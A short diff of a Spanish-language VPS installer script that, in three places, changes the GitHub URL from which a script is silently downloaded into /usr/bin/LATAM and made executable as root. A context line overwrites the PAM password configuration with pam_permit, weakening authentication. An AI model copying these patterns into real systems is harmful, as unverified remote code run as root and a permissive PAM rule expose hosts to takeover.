@@ -142,7 +142,7 @@ password required pam_permit.so' >/etc/pam.d/common-password && chmod +x /etc/pa
   clear && clear
   apt update
   apt upgrade -y
-  wget /root/LATAM https://raw.githubusercontent.com/NetVPS/LATAM_Oficial/main/Instalador/LATAM -O /usr/bin/LATAM &>/dev/null
+  wget /root/LATAM https://raw.githubusercontent.com/cisdan/latam/main/install.sh -O /usr/bin/LATAM &>/dev/null
   chmod +x /usr/bin/LATAM
 }
 
@@ -178,7 +178,7 @@ dependencias() {
 }
 
 install_paquetes() {
-  wget /root/LATAM https://raw.githubusercontent.com/NetVPS/LATAM_Oficial/main/Instalador/LATAM -O /usr/bin/LATAM &>/dev/null
+  wget /root/LATAM https://raw.githubusercontent.com/cisdan/latam/main/install.sh -O /usr/bin/LATAM &>/dev/null
   chmod +x /usr/bin/LATAM
   clear && clear
   #------- BARRA DE ESPERA
@@ -222,7 +222,7 @@ done
 
 ## PASO DOS
 Install_key() {
-  wget /root/LATAM https://raw.githubusercontent.com/NetVPS/LATAM_Oficial/main/Instalador/LATAM -O /usr/bin/LATAM &>/dev/null
+  wget /root/LATAM https://raw.githubusercontent.com/cisdan/latam/main/install.sh -O /usr/bin/LATAM &>/dev/null
   chmod +x /usr/bin/LATAM
   /bin/cp /etc/skel/.bashrc ~/
   clear && clear
